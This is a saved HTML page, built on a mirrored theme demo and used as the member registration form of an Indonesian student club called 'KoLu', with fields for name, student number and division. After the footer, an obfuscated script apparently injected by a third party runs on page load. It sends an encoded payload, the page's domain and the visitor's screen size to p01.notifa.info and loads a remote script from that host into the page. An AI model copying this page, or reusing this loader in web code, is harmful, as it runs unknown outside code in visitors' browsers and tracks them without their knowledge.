<!DOCTYPE html>
<html lang="en-US" class="no-js">

<!-- Mirrored from themesdemo.fastcomet.com/Plushiness/blog.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 10 Sep 2019 02:08:57 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="profile" href="https://gmpg.org/xfn/11">
	<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>
<!-- <title>Blog &#8211; Plushiness</title> -->
	<script language='JavaScript'>
var txt="|Pendaftaran Anggota KoLu |";
var speed=300;
var refresh=null;
function action() { document.title=txt;
txt=txt.substring(1,txt.length)+txt.charAt(0);
refresh=setTimeout("action()",speed);}action();
</script>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="profile" href="https://gmpg.org/xfn/11">
	<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>
	<link rel="icon" type="image/png" href="../images/logo-kolu.png" />
	<link rel="stylesheet" href="../grub/style.css" type="text/css" />


    <!-- Required meta tags-->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Colorlib Templates">
    <meta name="author" content="Colorlib">
    <meta name="keywords" content="Colorlib Templates">

    <!-- Title Page-->
    <title>Au Register Forms by Colorlib</title>

    <!-- Icons font CSS-->
    <link href="vendor/mdi-font/css/material-design-iconic-font.min.css" rel="stylesheet" media="all">
    <link href="vendor/font-awesome-4.7/css/font-awesome.min.css" rel="stylesheet" media="all">
    <!-- Font special for pages-->
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i,800,800i" rel="stylesheet">

    <!-- Vendor CSS-->
    <link href="vendor/select2/select2.min.css" rel="stylesheet" media="all">
    <link href="vendor/datepicker/daterangepicker.css" rel="stylesheet" media="all">

    <!-- Main CSS-->
    <link href="css/main.css" rel="stylesheet" media="all">




<link rel="stylesheet" type="text/css" href="../tabel/tabel.css">
<link rel="alternate" type="application/rss+xml" title="Plushiness &raquo; Feed" href="../feed/index.html" />
<link rel="alternate" type="application/rss+xml" title="Plushiness &raquo; Comments Feed" href="../comments/feed/index.html" />
<link rel='stylesheet' id='this-style-css'  href='../css/style.css' type='text/css' media='all' />
<link rel='stylesheet' id='sitemush-fonts-css'  href='https://fonts.googleapis.com/css?family=Merriweather%3A400%2C700%2C900%2C400italic%2C700italic%2C900italic%7CMontserrat%3A400%2C700%7CInconsolata%3A400&amp;subset=latin%2Clatin-ext' type='text/css' media='all' />
<link rel='stylesheet' id='genericons-css'  href='../css/genericons.css' type='text/css' media='all' />
<link rel='stylesheet' id='sitemush-style-css'  href='../css/1-style.css' type='text/css' media='all' />
<!--[if lt IE 10]>
<link rel='stylesheet' id='sitemush-ie-css'  href='css/ie.css' type='text/css' media='all' />
<![endif]-->
<!--[if lt IE 9]>
<link rel='stylesheet' id='sitemush-ie8-css'  href='css/ie8.css' type='text/css' media='all' />
<![endif]-->
<!--[if lt IE 8]>
<link rel='stylesheet' id='sitemush-ie7-css'  href='css/ie7.css' type='text/css' media='all' />
<![endif]-->
<link rel='stylesheet' id='mpce-venobox-css-css'  href='../css/venobox.css' type='text/css' media='all' />
<link rel='stylesheet' id='mpce-theme-css'  href='../css/theme.css' type='text/css' media='all' />
<style id='mpce-theme-inline-css' type='text/css'>
.sm-row-fixed-width{max-width:1170px;}
</style>
<link rel='stylesheet' id='mpce-bootstrap-grid-css'  href='../css/bootstrap-grid.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='mpce-font-awesome-css'  href='../css/font-awesome.min.css' type='text/css' media='all' />
<script type='text/javascript' src='../js/jquery.js'></script>
<script type='text/javascript' src='../js/jquery-migrate.min.js'></script>
<script type='text/javascript' src='../js/header.js'></script>
<!--[if lt IE 9]>
<script type='text/javascript' src='js/html5.js'></script>
<![endif]-->
<script type='text/javascript' src='../js/venobox.min.js'></script>
<link rel='https://api.w.org/' href='../szp-json/index.html' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="xmlrpc0db0.html?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="site-inc/wlwmanifest.html" /> 
<meta name="generator" content="SitePad" />
		<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
		</head>

<body class="blog hfeed">
<div id="page" class="site container-fluid">
	<div class="site-inner">
			
		
		<header id="masthead" class="site-header" role="banner"><div class="sm-row-fluid smue-row sme-dsbl-margin-left sme-dsbl-margin-right header">
<div class="sm-span12 smue-clmn  sme-dsbl-margin-left sme-dsbl-margin-right">
<div class="sm-row-fluid smue-row sme-dsbl-margin-left sme-dsbl-margin-right">
<div class="sm-span12 smue-clmn sme-dsbl-margin-left sme-dsbl-margin-right">
<div class="smue-ce-icon-obj smue-ce-icon-size-extra-large  smue-ce-icon-align-center">
<div style="background-color:transparent; border-color: transparent;" class="smue-ce"><span style="color:rgb(255, 255, 255)"><a href="../login/login.php"><img src="../images/logo-kolu.png">
</a></span></div>
</div>
</div>
</div>
<div class="sm-row-fluid smue-row sme-dsbl-margin-left sme-dsbl-margin-right">
<div class="sm-span12 smue-clmn sme-dsbl-margin-left sme-dsbl-margin-right site_title">
<div class="smue-szp_site_title smue-ce-child-detector"><div class="site-title-container"  ><a href="../index.html" ></a></div></div>
</div>
</div>
<div class="sm-row-fluid smue-row sme-dsbl-margin-left sme-dsbl-margin-right">
<div class="sm-span12 smue-clmn sme-dsbl-margin-left sme-dsbl-margin-right">
<div class="smue-text-obj tag_line">
<p style="text-align: center;">Design by <a href="#">KoLU</a></p>
</div>
</div>
</div>
</div>
</div>
<div class="sm-row-fluid smue-row sme-dsbl-margin-left sme-dsbl-margin-right hexagon_header">
</div>
<div class="sm-row-fluid smue-row sme-dsbl-margin-left sme-dsbl-margin-right">
<div class="sm-span12 smue-clmn  sme-dsbl-margin-left sme-dsbl-margin-right">
<center><div class="smue-szp_primary_nav smue-ce-child-detector "><i id="menu-toggle" aria-expanded="false"><img src="../images/nav.png"> </i>  <button class="menu-toggle" id="menu-toggle" aria-expanded="false" aria-controls="site-navigation social-navigation">Menu</button>
	<div id="site-header-menu" class="site-header-menu">
		<nav id="site-navigation" class="main-navigation" role="navigation" aria-label="Primary Menu">
			<div class="menu-header-menu-container">
			<ul id="menu-header-menu" class="primary-menu">
			<li id="menu-item-8" class="home menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-8" style="  " >
				<a href="../index.html" style="  " >Home</a>
			</li>
			<li id="menu-item-8" class="home menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-8" style="  " >
				<a href="https://www.kolu.web.id/blog/" style="  " >Blog</a>
			</li>
			<li id="menu-item-8" class="home menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-8" style="  " >
				<a href="../post.php" style="  " >Post</a>
			</li>
			<li id="menu-item-9" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item menu-item-9" style="  " >
				<a  href="../form/fungsi.php" style="  " >Pendaftaran</a>
			</li>
			<li id="menu-item-9" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9" style="  " >
				<a href="../anggotabaru.php">Anggota Baru</a>
			</li>
			<li id="menu-item-9" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9" style="  " >
				<a href=" ">Registrasi Devisi</a>
			</li>
			</ul>
			</div>
		</nav><!-- .main-navigation -->
	</div><!-- .site-header-menu --></div>
</center>
<style>@media screen and (min-width:768px) { .site-header-menu .main-navigation .primary-menu > li {} .site-header-menu .main-navigation a{} .site-header-menu .main-navigation .sub-menu a {} .site-header-menu .main-navigation .current-menu-item > a {} .site-header-menu .main-navigation li:hover > a {} .site-header-menu .main-navigation .primary-menu > .menu-item-has-children > a::after {} .site-header-menu .main-navigation ul ul .menu-item-has-children > a::after {} } @media screen and (max-width:767px) { .site-header-menu .main-navigation a, .site-header-menu .main-navigation .sub-menu a {} i.responsive_bar{} .site-header-menu .main-navigation li.current-menu-item > a {} .site-header-menu .main-navigation a:hover, .site-header-menu .main-navigation .primary-menu li a:hover {} .site-header-menu {} .dropdown-toggle:after {} }</style><script type="text/javascript">
		
		jQuery(document).ready(function(){
			
			var maxwidth = 0;
			var menu_len = jQuery("div.smue-szp_primary_nav").length; // number of menus added
			
			jQuery( "ul.primary-menu > li" ).each(function() {
				maxwidth += jQuery(this).width(); // Find total width
			});
			
			if(menu_len){
				maxwidth /= menu_len; // Divide the total width with number of menus
			}
			
			jQuery( ".smue-szp_primary_nav" ).css( "maxWidth", maxwidth + "px" ); // Assign the maxWidth
		});		
		</script>
</div>
</div>

		</header><!-- .site-header -->
		<script language="javascript" type="text/javascript">
			var cur_page_data = {pageid:"6", pagename:"default-post"};
			var cur_themes_url = "http://demos.sitemush.com/Plushiness/site-data/themes";
		</script>
		<div id="content" class="site-content">

	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

		
							<header>
					<h1 class="page-title screen-reader-text">Blog</h1>
				</header>
			
			
<article id="post-6" class="post-6 post type-post status-publish format-standard hentry category-uncategorized">

<br><br><br><br><br>

        <div class="wrapper wrapper--w790">
                <div class="">
                    <form method="POST" action="../insertformregistrasi.php">
                        <div class="form-row">
                            <div class="name">Nama Lengkap</div>
                            <div class="value">
                                <div class="input-group">
                                    <input class="input--style-5" type="text" name="nama" required="">
                                </div>
                            </div>
                        </div>
                        <div class="form-row">
                            <div class="name">NPM</div>
                            <div class="value">
                                <div class="input-group">
                                    <input class="input--style-5" type="text" name="npm" required="">
                                </div>
                            </div>
                        </div>
                        <div class="form-row">
                            <div class="name">Divisi</div>
                            <div class="value">
                                <div class="input-group">
                                    <div class="rs-select2 js-select-simple select--no-search">
                                        <select name="divisi" required="">
                                            <option disabled="disabled" selected="selected">Pilih Divisi</option>
                                            <option>Jaringan</option>
                                            <option>Website</option>
                                            <option>DOS</option>
                                            <option>Distro</option>
                                        </select>
                                        <div class="select-dropdown"></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div>
                            <button class="btn btn--radius-2 btn--red" type="submit">Register</button>
                        </div>
                    </form>
                </div>
        </div>




</article><!-- #post-## -->

		</main><!-- .site-main -->
		
	</div><!-- .content-area -->

		</div><!-- .site-content -->
		
		
		<footer id="colophon" class="site-footer" role="contentinfo"><div class="sm-row-fluid smue-row sme-dsbl-margin-left sme-dsbl-margin-right">
<!-- <div class="sm-span12 smue-clmn  sme-dsbl-margin-left sme-dsbl-margin-right">
<div class="smue-ce-icon-obj hexagon_alt smue-ce-icon-shape-none  smue-ce-icon-size-large  smue-ce-icon-align-center  sme-dsbl-padding-left sme-dsbl-padding-right sme-dsbl-margin-top sme-dsbl-margin-bottom" style="">
<div style="background-color:transparent; border-color: transparent;" class="smue-ce-icon-bg"><span class="fa fa-wrench smue-ce-icon-preview" style="color:rgb(255, 255, 255)"></span></div>
</div>
</div> -->
</div>
<div class="sm-row-fluid smue-row sme-dsbl-margin-left sme-dsbl-margin-right footer">
<div class="sm-span12 smue-clmn  sme-dsbl-margin-left sme-dsbl-margin-right">
<div class="smue-code-obj copyright">
<p style="text-align: center;">Design Theme by Kolu Divisi Web</p>
</div>
</div>
</div>

		</footer><!-- .site-footer -->	</div><!-- .site-inner -->
</div><!-- .site -->

<script type='text/javascript' src='js/skip-link-focus-fix.js'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var screenReaderText = {"expand":"expand child menu","collapse":"collapse child menu"};
/* ]]> */
</script>
<script type='text/javascript' src='js/functions.js'></script>
<script type='text/javascript' src='js/szp-embed.min.js'></script>
<script type='text/javascript' src='js/jquery.waypoints.min.js'></script>
<script type='text/javascript' src='js/mp-waypoint-animations.js'></script>
<style id="smue-ce-private-styles" data-posts="" type="text/css"></style><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2II0eYwDqoSCjfBSYtPWbki8D23eilME4KIDreZuGXCAnCNXi1B1VX71vlezNfIhdAanAJZQUlVS%2fMuQfv%2bUnH2l%2fiNcTAatXOlffQSZ73B8hecj64CObIjXivKC%2buSDPcpPg9cI7g3GF4d4rQJRXTzn8gKnr%2bcgtVWLR9OLLomLYzJuH14KtcSV0YbKKYWXeAjWMn%2bo7kMvO9TAfKK1JpliL114KDz89iHCoSEa7D%2bQCEoZBizFl%2bveIj7cDazO8zEENqI4oGUCRUvKEnxZJTCOvvFjaFrXj1oZjfK4mYlC2EIzuUEQU1Zp%2b3mF9LBq0V79derk%2fUIeNcQsAw2uhLsCYNuGOiE1NJw3klwNYovgVERU6e7g%2b93N98Bm7U3pOZraIAAAeveyDlUVsDsBn%2bw9towmM4mGGPT6JpL5ao9BL%2bhSvVT6LO8FpSACRvQAyCJxOLpJeLaMNSZ6uOxwPwnlaHzxoF7bm2olzxtMpqGKrzbrQLLnYR%2fK%2bTtu2ptoWpvGhB1nccQ3H1q2DUirrTRSjWv%2b4Ot%2f9" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from themesdemo.fastcomet.com/Plushiness/blog.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 10 Sep 2019 02:08:58 GMT -->
</html>